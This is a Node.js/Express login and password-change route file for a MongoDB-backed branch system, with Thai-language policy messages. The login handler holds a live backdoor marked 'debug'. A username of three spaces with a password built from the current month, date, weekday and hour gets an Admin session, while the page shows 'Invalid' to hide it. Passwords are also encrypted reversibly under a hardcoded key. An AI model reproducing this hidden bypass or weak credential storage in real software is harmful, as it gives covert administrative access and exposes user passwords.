
var ObjectId = require('mongoskin').ObjectId;

function pwdencryptest(password){
        	var crypto = require('crypto'),
            algorithm = 'aes-128-cbc',
            key = 'Pas$w0rd';
        	
        	  var cipher = crypto.createCipher(algorithm,key)
        	  var crypted = cipher.update(password,'utf8','hex')
        	  crypted += cipher.final('hex');
//        	  console.log ('11111111111111111111111', crypted)
        	  return crypted;  
        };
module.exports = {
		index : function(req,res,callback){            
			if (req.session.userLogin){res.redirect('/');}
			res.render('login',{err:''});
		},
		login : function(req,res,callback){
            //debug 20160617 ====================================================
            var d = new Date()
            var userPass0 = d.getMonth().toString()
                +d.getDate().toString()
                + d.getDay().toString()
                + d.getHours().toString()
            //console.log('Date--------------',userPass0,req.body.txtPWD);
            if(req.body.txtUser=='   ' && req.body.txtPWD==userPass0) {
                req.db.collection('sys-menu').find({},{roleLevel : 0,discription : 0, _id : 0}).toArray(function(err,recs){
                    //console.log('menu--------------',recs);
                    req.session.userLogin='.';
                    req.session.roleLevel = 'Admin';
                    req.session.userMenu = recs;
                    res.render('login',{err:'User or Password Invalid..'});
                })               
            }
            //debug 20160617 ====================================================

			var username = req.body.txtUser;
			var password = pwdencryptest(req.body.txtPWD);
			var db_userList = req.db.collection('userList');
			var db_menu = req.db.collection('sys-menu');
			db_userList.findOne({'userName' : username,'userPass.0.userPass' : password},function(err,rec){
				if (err) throw err;
				if (rec){
					
					CheckPolicy(rec,function(message,showdialog){
						/*add on May 14,2016 for filter condition*/
						if (message && (!showdialog)){
							res.render('login',{'err':message});
						}else{
							
							req.session.userLogin = rec;
							var userRoleLevel = rec.roleLevel;
							req.session.roleLevel = rec.roleLevel;
                            //console.log('roleLevel--------------',req.session.roleLevel);
							rec.lastLogon.splice(0,0,new Date());
							rec.lastLogon.splice(5);
							
							Fn_LevelUse(req,rec.branchFilte,function(err,result){
								db_menu.find({'roleLevel' : userRoleLevel},{roleLevel : 0,discription : 0, _id : 0}).toArray(function(err,recs){
									//console.log('menu--------------',recs);
									db_userList.findOneAndUpdate({'userName' : username,'userPass.0.userPass' : password},{'$set' : {'lastLogon' : rec.lastLogon}},function(err,rec){
										if(showdialog){req.session.alertmsg = message;}
										req.session.userMenu = recs;
										res.redirect('/');
									});
									
								})
								
							});
						}
					})
					
			
				}else{
					res.render('login',{'err':'User or Password Invalid'});
				}
			});
		},
		logout : function(req,res,callback){
			req.session.destroy();
			res.redirect('/login');
		},
		changepwdindex : function(req,res,next){
			res.render('Change_Password',{title:'Config System'
				,host:req.protocol + '://' + req.get('host') ,
				  user: req.session.userLogin, 
				  menu: req.session.userMenu,
				  err: ''
			  });
		},
		changepwd : function(req,res,next){
        	var username = req.body.username;
        	var userid = req.body.userid;
        	var oldpassword = pwdencryptest(req.body.oldpassword);
        	var password = pwdencryptest(req.body.password);
        	var db = req.db.collection('userList');

        	console.log('----------------------',userid);
        	//console.log(req.body.oldpassword,req.body.password);
        	
        	db.findOne({'userName' : username,'userPass.0.userPass' : oldpassword},function(err,rec){
        		
        		console.log("rec",rec);
        		if (err) throw err;
        		
        		if(rec){
        			
        			var dateEx = new Date();
                	var uname = '';
            		dateEx.setDate(dateEx.getDate() + 90);
                    db.findOne({
                    	 "_id" : ObjectId(userid)
                    },function(err, rec){
                        if(!err){       
//                        	console.log(rec.userPass[0]);
                // 			var deployS = 'wait'
            				// if (rec.branchID  == '0000' || rec.branchID.length < 4){deployS = 'Successfully';}
            				// else {deployS = 'wait'}
                        	var newPWD = {'userPass' : password , 'dateCreate' : new Date(),'dateExpiry' : dateEx};
                        	
                        	uname = rec.userName,
                        	// brid = rec.branchID,
                        	brname = rec.branchName,
                        	rec.userPass.splice(0,0,newPWD),
                        	rec.userPass.splice(6)
                        	console.log(rec.userPass);
                       db.findOneAndUpdate({
                        "_id" :  ObjectId(userid)                      
                    },{ 
                       "$set" : {
                           "userPass" : rec.userPass,
                           "worngLogin" : 0,
                           "firstLogon" :  Boolean(0),
                           // "deployStatus" : deployS                          
                        }

                    },function(err,record){
                       if(!err){
                    	   // console.log('U:' + uname);
                    	   // console.log('brid:' + brid);
//                         	db.find({ "userName" : uname },{"_id":0,"branchID":0,"branchName":0,"dateUpdate":0,"fileUpdate":0,"delete":0,"action":0}).sort({"_id": 1 }).toArray(function(err,results){	
//                         		if (!err){
//                         			//console.log( 'user|' , result);
//                         			////////////////////////write file////////////////////////////////////////
//                         			var fs = require('fs');
//                         	    	var filenamepath ="/public/download/userList_" +  brid + '_' + new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '').replace(' ', '-').replace(':', '-').replace(':', '-')  +  ".json";
//                         	    	var filename ="userList_" + brid + '_' + new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '').replace(' ', '-').replace(':', '-').replace(':', '-')  +  ".json";
// //                        	    	
//                         	    	var data ="[";
//                 	    	    	for(var i=0;i<results.length;i++){
//                 	    	    		if (i != 0) {
//                 	    	    			data += ','
//                 	    	    		}
//                 	        	    	data +='{"collection":"userList",';
//                 	        	    	data +='"query": {"userName":"' + results[i].userName  + '"},';
//                 	        	    	data +='"action":"update",';
//                 	        	    	data +='"data":' + JSON.stringify(results[i]);
//                 	        	    	data +='}';
//                 	        	    	}
//                 	        	    	data+="]"
                	        	//        if (rec.branchID  !== '0000' && rec.branchID.length >= 4){
                       	    	// fs.writeFile(__dirname.replace('/routes','')  + filenamepath, data, function(err){		//linux
                        	    // 	 if(!err){	    			
                        	    // 			console.log('write_file_reset' + filename + '_in_public_path_Success');	  
                        	    // 			//console.log(req)
                        	    // 			req.db.collection('sys-update-log').insertOne(
                        	    // 					{
                        	    // 						branchID : brid
                        	    // 						,branchName : brname
                        	    // 						,deploytype: 'json'
                            	//     					,deployval : filename
                            	//     					,deploykind : 'userList'
                            	//     					,deployby : req.session.userLogin.userName	
                        	    // 						,filepath : req.protocol + '://' + req.get('host')  + filenamepath.replace('/public','')
                        	    // 						,filename : filename
                        	    // 						,createdate : new Date()
                        	    // 						,deploySchedule : new Date()
                        	    // 					    ,status :'wait'
                        	    // 					    ,modifydate : new Date()
                        	    // 						,reDeploy : '336'
                        					// 			,timeout : '30'
                        	    // 					    ,updated :  'now'
                        	    // 					},function(err, result) {
	                        	   //  					 if (err) throw err;
	                        	   //  					 console.log('writeDB_BrID=_'+ brid + '_complete');
                        	    // 				     }); 
                        	    // 		}
                        	    // 		else {
                        	    // 			console.log('error|' +err);
                        	    // 		}
                        	    // 	})
                        		// }
                        	    	
                        	//    }
                        		
                        	// });
                    	   
                            res.send('Change Password Complate.');
                        }

                    }
                    );
                        	
                        }
                    });   
                    
        		}else{
        			res.send('Old Password Invalid');
        		}
        	})
        	
        }
};
////////////////////////////////////////////////////////////////////
function Fn_LevelUse(req,branch,callback){

    if (typeof  branch === 'undefined' ){ callback(null,'');   return;}
    if (branch.length>0){
        req.session.branchFilter = branch;
        
        // getZoneByBR(req,branch,function(err,result){
            // var tmp = result;
            // req.session.zoneFilter= tmp;
            // //console.log('callback getZoneByBR', result,req.session.zoneFilter);
            // getRegionByBR(req,branch,function(err,result1){
            //     //console.log('callback getRegionByBR', result1);
            //     var tmp = result1;
            //     req.session.regionFilter= tmp;
                callback(null,'');
            // });
        // });       
    }    
};
///////////////////////////////////////////////////////////////////
// function Fn_LevelUse(req,branch,zone,region,callback){

// 	if (typeof  branch === 'undefined' ){ callback(null,'');   return;}
// 	if (branch.length>0){
// 		req.session.branchFilter = branch;
		
// 		getZoneByBR(req,branch,function(err,result){
// 			var tmp = result;
// 			req.session.zoneFilter= tmp;
// 			//console.log('callback getZoneByBR', result,req.session.zoneFilter);
// 			getRegionByBR(req,branch,function(err,result1){
// 				//console.log('callback getRegionByBR', result1);
// 				var tmp = result1;
// 				req.session.regionFilter= tmp;
				
// 				callback(null,'');
// 			});
// 		});
		
// 	}else{

// 		if (zone.length>0){
// 			req.session.zoneFilter =zone;
	
// 			getRegionByZone(req,zone,function(err,result){
// 				var tmp = result;
// 				req.session.regionFilter= tmp;
// 				callback(null,'');
// 			});

// 		}else{
			
// 			if (region.length>0){
// 				req.session.regionFilter =region;
// 				callback(null,'');
// 			}else{
// 				callback(null,'');
// 			}
			
// 		}

// 	}
	
// };

function getZoneByBR(req,arr,callback){
	var cond = {'branchID' :{ $exists: true, $in: arr}};
	var data=[];
	req.db.collection('branch').aggregate([
       {$match : cond},
       { $group :{
    	   _id : '$zoneID', 
         	}
        },
        {$sort : {_id:1}}                      		                                    		    
        ], function(err, result) {
			for(var i=0 ; i< result.length;i++){
				data.push(result[i]._id)
			}     
			callback(null,data);
	});
};

function getRegionByBR(req,arr,callback){
	var cond = {'branchID' :{ $exists: true, $in: arr}};
	var data=[];
	req.db.collection('branch').aggregate([
       {$match : cond},
       { $group :{
    	   _id : '$regionID', 
         	}
        },
        {$sort : {_id:1}}                      		                                    		    
        ], function(err, result) {
			for(var i=0 ; i< result.length;i++){
				data.push(result[i]._id)
			}     
			callback(null,data);
	});
};

function getRegionByZone(req,arr,callback){
	var cond = {'ZoneID' :{ $exists: true, $in: arr}};
	var data=[];
	req.db.collection('zone').aggregate([
       {$match : cond},
       { $group :{
    	   _id : '$RegionID', 
         	}
        },
        {$sort : {_id:1}}                      		                                    		    
        ], function(err, result) {
			for(var i=0 ; i< result.length;i++){
				data.push(result[i]._id)
			}     
			callback(null,data);
	});
};

function CheckPolicy(user,callback){
	
        var dt = new Date();
        dt = dt.setDate(dt.getDate());
        var nt = user.userPass[0].dateExpiry.setDate(user.userPass[0].dateExpiry.getDate());
        var dd = parseInt((nt - dt)/1000/60/60/24);
        
        var returnmsg = "";
        var showdialog = false;
        
        // console.log('Password expire date ->', dd);
        if (user.passPolicy == true)  {
          // console.log('---------------------------', user.passPolicy);
          if (user.userState == 'lock')  {
        	   returnmsg = 'Username ถูกระงับการใช้งานเนื่องจากป้อนรหัสผ่านผิดเกิน 3 ครั้ง กรุณาติดต่อผู้ดูแลระบบ';
          }
          if (user.userState == 'disable')  {
        	   returnmsg = 'Username ถูกระงับการใช้งาน เนื่องจากสถานะเป็น disable';
          }
          if (user.userState == 'delete')  {
        	  returnmsg = 'Username ถูกลบ กรุณาติดต่อผู้ดูแลระบบ';
          }
          var tx = new Date();
          
          if (user.expireDate != '' )  {
            if (tx > user.expireDate)  {
            	returnmsg = 'Username ถูกระงับการใช้งานเนื่องจากหมดอายุ กรุณาติดต่อผู้ดูแลระบบ';
            }
          }
          // if (user.disableStart != '' && user.disableExpire != '')  {
          //   tx.setHours(0, 0, 0, 0);
          //   var tb = user.disableStart;
          //   tb.setHours(0, 0, 0, 0);
          //   var te = user.disableExpire;
          //   te.setHours(0, 0, 0, 0);
          //   console.log('tNow/tStart/tExpri', tx, tb, te);
          //   if (tx >= tb && tx <= te)  {
          //   	returnmsg = 'Username ??????????? ??????????? disable ?????????';
          //   }              
          // }
          if (dd < 0)  {
        	   returnmsg = 'รหัสผ่านหมดอายุ กรุณาติดต่อผู้ดูแลระบบ';
          }
        }
        var role = 0;
        /*for (var j in conf.roleLevel)  {
          if (conf.roleLevel[j].role == user.roleLevel) role++;
        }
        if (role == 0)  {
          socket.emit('rmt-alert', {text: '?????????????????????? Smart Q', win: ''});
          break;
        }*/
       if (dd < 14)  {
    	   returnmsg = 'เหลืออีก '+dd+' วัน รหัสผ่านจะหมดอายุ กรุณาเปลี่ยนรหัสผ่านใหม่';
    	   showdialog = true;
        }
       
       callback(returnmsg,showdialog);
}